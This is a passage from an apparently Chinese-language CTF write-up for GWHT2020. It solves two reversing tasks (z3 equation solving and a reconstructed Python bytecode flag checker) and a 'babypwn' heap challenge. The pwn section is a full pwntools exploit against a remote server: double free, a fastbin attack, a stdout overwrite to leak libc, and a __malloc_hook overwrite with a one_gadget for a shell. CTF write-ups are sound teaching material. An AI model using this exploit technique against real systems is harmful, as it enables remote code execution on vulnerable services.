solve(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748 , a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258 , a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190 , a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + (a8 << 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136 , a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915 , a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298 , a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875 , a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784 , a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710 , a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376 , a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065 , a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687 , a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250 , a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)

A = [10,24,119,7,104,43,28,91,108,52,88,74,88,33]
i = 12
while i >= 0:
    A[i] ^= A[i+1]
    i -= 1

for i in A:
    print(chr(i), end = '')
a = b'U_G07_th3_k3y!'
print(hashlib.md5(a).hexdigest())

```



## Bytecode

python字节码反汇编成的伪代码，还原成的源代码逻辑大概如下(dis模块是为了验证字节码是否正确）：

```python
import dis


def main():
	en = [3, 37, 72, 9, 6, 132]
	output = [101, 96, 23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]
	print('welcome to GWHT2020')
	flag = input('please input your flag:')
	str = flag
	a = len(str)
	if a < 38:
		print('lenth wrong')
		exit(0)
	else:
		if (((ord(str[0]) * 2020 +  ord(str[1])) * 2020 + ord(str[2]))*2020 + ord(str[3])) * 2020 + ord(str[4]) == 1182843538814603:
			print('good!continue\xe2\x80\xa6\xe2\x80\xa6')
		else:
			print('bye~')
			exit(0)
		x = []
		k = 5
		for i in range(13):
			b = ord(str[k])
			c = ord(str[k+1])
			a11 = c ^ en[i%6]
			a22 = b ^ en[i%6]
			x.append(a11)
			x.append(a22)
			k = k + 2
		if x == output:
			print('good!continue\xe2\x80\xa6\xe2\x80\xa6')
		else:
			print('oh,you are wrong!')
			exit(0)
		l = len(str)
		a1 = ord(str[l-7])
		a2 = ord(str[l-6])
		a3 = ord(str[l-5])
		a4 = ord(str[l-4])
		a5 = ord(str[l-3])
		a6 = ord(str[l-2])
		if a1 * 3 + a2 * 2 + a3 * 5 == 1003:
			pass
		else:
			print('wrong')
		if a1 * 4 + a2 * 7 + a3 * 9 == 2013:
			pass
		else:
			print('wrong')
		if a1 + a2 * 8 + a3 * 2 == 1109:
			pass
		else:
			print('wrong')
		if a4 * 3 + a5 * 2 + a6 * 5 == 671:
			pass
		else:
			print('wrong')
		if a4 * 4 + a5 * 7 + a6 * 9 == 1252:
			pass
		else:
			print('wrong')
		if a4 + a5 * 8 + a6 * 2 == 644:
			print('congratulations!')
		else:
			print('wrong')


print(dis.dis(main))
main()

```

脚本如下：

```python
from z3 import *

a1 = Int('a1')
a2 = Int('a2')
a3 = Int('a3')
a4 = Int('a4')
a5 = Int('a5')
a6 = Int('a6')

s = Solver()

s.add(a1 * 3 + a2 * 2 + a3 * 5 == 1003)
s.add(a1 * 4 + a2 * 7 + a3 * 9 == 2013)
s.add(a1 + a2 * 8 + a3 * 2 == 1109)
s.add(a4 * 3 + a5 * 2 + a6 * 5 == 671)
s.add(a4 * 4 + a5 * 7 + a6 * 9 == 1252)
s.add(a4 + a5 * 8 + a6 * 2 == 644)

print(s.check())
m = s.model()
print ("traversing model...")
for d in m.decls():
    print("{} = {}".format(d.name(), (m[d])))
a = [55,101,51,102,102,97]
for i in a:
	print(chr(i))

a5 = 55
a2 = 101
a6 = 51
a3 = 102
a4 = 102
a1 = 97

for i in range(32,128):
	for j in range(32,128):
		for k in range(32,128):
			for l in range(32,128):
				for m in range(32,128):
					if (((i * 2020 +  j) * 2020 + k)*2020 + l) * 2020 + m == 1182843538814603:
						print(i ,' ',j,' ',k,' ',l,' ',m)
						exit(0)

# 第6~31个字符
output = [101, 96, 23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]
k = 0
out_put = []
en = [3, 37, 72, 9, 6, 132]
for i in range(13):
    out_put.append(output[k+1] ^ en[i%6])
    out_put.append(output[k] ^ en[i%6])    
    k += 2

a = 'GWHT{'
flag = []
for i in a:
	flag.append(ord(i))

for i in out_put:
	flag.append(i)

flag.append(a1)
flag.append(a2)
flag.append(a3)
flag.append(a4)
flag.append(a5)
flag.append(a6)

for i in flag:
	print(chr(i), end= '')
print('}')
```





## babypwn

malloc_consolidate+double free修改small bin的size以劫持stdout来leak，之后doube free+fastbin attack打malloc_hook拿shell。

exp：

```
from pwn import *
context.log_level='debug'
DEBUG=0
# if DEBUG:
# 	p=process("./babypwn")
# 	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
# else:
# 	p=remote('183.129.189.60',10032)
# 	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def cmd(command):
	p.recvuntil(": ")
	p.sendline(str(command))

def add(sz,name,message):
	cmd(1)
	p.recvuntil(': ')
	p.sendline(str(sz))
	p.recvuntil(':')
	p.send(name)
	p.recvuntil(':')
	p.sendline(message)

def dele(idx):
	cmd(2)
	p.recvuntil(':')
	p.sendline(str(idx))

# def show():
# 	cmd(2)



def pwn():
	


	add(0x30,p64(0x71)*4,'a') #0
	add(0x30,p64(0x71)*4,'a') #1
	add(0x10,'a',p64(0x41)*4) #2
	dele(0)
	dele(2)
	cmd(1)
	p.recvuntil(': \n')
	p.sendline('0'*0x400)
	add(0x30,p64(0x41)*6,p64(0x41)*4) #3

	dele(3)
	dele(1)
	dele(3)
	# gdb.attach(p)
	# heap=int(raw_input("input: "),16)
	heap=0xa100
	add(0x30,p16(heap),'a') #4

	add(0x30,'a','a') #5
	add(0x30,'a','a') #6
	add(0x30,'\x00'*8+p64(0x71),'a') #7
	add(0x68,'a','a') #8
	add(0x68,'a','a') #9
	
	dele(9)
	dele(8)
	dele(9)
	add(0x68,p16(heap+0x10),'a')
	# gdb.attach(p)
	# stdout=int(raw_input("input: "),16)
	stdout=0x25dd
	add(0x10,p16(stdout),'a')
	add(0x68,'a','a')
	add(0x68,'a','a')
	add(0x68,'a','a')
	cmd(1)
	p.recvuntil(': \n')
	p.sendline(str(0x68))
	p.recvuntil(':\n')
	p.send('\x00'*0x33+p64(0xfbad1800) + p64(0)*3 + '\x00')
	libc.address=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600
	p.recvuntil(':')
	p.sendline('aaaa')
	
	success('libc: '+hex(libc.address))
	dele(11)
	dele(8)
	dele(11)
	add(0x68,p64(libc.sym['__malloc_hook']-0x23),'a')
	add(0x68,'a','a')
	add(0x68,'a','a')
	# add(0x68,'a','a')
	add(0x68,'a'*0x13+p64(libc.address+0xf0364),'a')
	dele(2)
	dele(2)

	# gdb.attach(p)
	p.interactive()

if __name__ == "__main__":
	for i in range(0x100):
		if DEBUG:
			p=process("./pwn")
			libc=ELF("./libc-2.23.so")
		else:
			p=remote('183.129.189.60',10031)
			libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
		try:
			pwn()
		except:
			p.close()
			# 183.129.189.60:10031
```





